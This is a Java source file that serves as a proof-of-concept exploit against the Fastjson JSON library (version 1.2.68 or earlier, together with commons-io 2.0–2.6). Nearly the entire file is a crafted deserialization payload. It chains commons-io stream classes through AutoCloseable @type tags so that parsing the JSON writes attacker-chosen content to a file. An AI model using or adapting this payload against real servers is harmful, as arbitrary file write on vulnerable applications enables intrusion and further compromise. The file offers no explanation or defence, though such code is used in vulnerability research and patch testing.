package test;

import com.alibaba.fastjson.JSON;

public class Fastjson5_io_write_1 {
    public static void main(String[] args) throws Exception {
    	//<=1.2.68 and commons-io-2.0-2.6
    	String code = "test";
        for (int i = 0; i < 8200; i++) {
			code += "a";
		}
        String payload = "{\r\n"
        		+ "  \"x\":{\r\n"
        		+ "    \"@type\":\"com.alibaba.fastjson.JSONObject\",\r\n"
        		+ "    \"input\":{\r\n"
        		+ "      \"@type\":\"java.lang.AutoCloseable\",\r\n"
        		+ "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\r\n"
        		+ "      \"reader\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\r\n"
        		+ "        \"charSequence\":{\"@type\":\"java.lang.String\"\""+code+"\"\r\n"
        		+ "      },\r\n"
        		+ "      \"charsetName\":\"UTF-8\",\r\n"
        		+ "      \"bufferSize\":1024\r\n"
        		+ "    },\r\n"
        		+ "    \"branch\":{\r\n"
        		+ "      \"@type\":\"java.lang.AutoCloseable\",\r\n"
        		+ "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\r\n"
        		+ "      \"writer\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\r\n"
        		+ "        \"file\":\"1.txt\",\r\n"
        		+ "        \"encoding\":\"UTF-8\",\r\n"
        		+ "        \"append\": false\r\n"
        		+ "      },\r\n"
        		+ "      \"charsetName\":\"UTF-8\",\r\n"
        		+ "      \"bufferSize\": 1024,\r\n"
        		+ "      \"writeImmediately\": true\r\n"
        		+ "    },\r\n"
        		+ "    \"trigger\":{\r\n"
        		+ "      \"@type\":\"java.lang.AutoCloseable\",\r\n"
        		+ "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
        		+ "      \"is\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
        		+ "        \"input\":{\r\n"
        		+ "          \"$ref\":\"$.input\"\r\n"
        		+ "        },\r\n"
        		+ "        \"branch\":{\r\n"
        		+ "          \"$ref\":\"$.branch\"\r\n"
        		+ "        },\r\n"
        		+ "        \"closeBranch\": true\r\n"
        		+ "      },\r\n"
        		+ "      \"httpContentType\":\"text/xml\",\r\n"
        		+ "      \"lenient\":false,\r\n"
        		+ "      \"defaultEncoding\":\"UTF-8\"\r\n"
        		+ "    },\r\n"
        		+ "    \"trigger2\":{\r\n"
        		+ "      \"@type\":\"java.lang.AutoCloseable\",\r\n"
        		+ "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
        		+ "      \"is\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
        		+ "        \"input\":{\r\n"
        		+ "          \"$ref\":\"$.input\"\r\n"
        		+ "        },\r\n"
        		+ "        \"branch\":{\r\n"
        		+ "          \"$ref\":\"$.branch\"\r\n"
        		+ "        },\r\n"
        		+ "        \"closeBranch\": true\r\n"
        		+ "      },\r\n"
        		+ "      \"httpContentType\":\"text/xml\",\r\n"
        		+ "      \"lenient\":false,\r\n"
        		+ "      \"defaultEncoding\":\"UTF-8\"\r\n"
        		+ "    },\r\n"
        		+ "    \"trigger3\":{\r\n"
        		+ "      \"@type\":\"java.lang.AutoCloseable\",\r\n"
        		+ "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
        		+ "      \"is\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
        		+ "        \"input\":{\r\n"
        		+ "          \"$ref\":\"$.input\"\r\n"
        		+ "        },\r\n"
        		+ "        \"branch\":{\r\n"
        		+ "          \"$ref\":\"$.branch\"\r\n"
        		+ "        },\r\n"
        		+ "        \"closeBranch\": true\r\n"
        		+ "      },\r\n"
        		+ "      \"httpContentType\":\"text/xml\",\r\n"
        		+ "      \"lenient\":false,\r\n"
        		+ "      \"defaultEncoding\":\"UTF-8\"\r\n"
        		+ "    }\r\n"
        		+ "  }\r\n"
        		+ "}\r\n"
        		+ "";
        System.out.println(payload);
        JSON.parse(payload);	
    }
}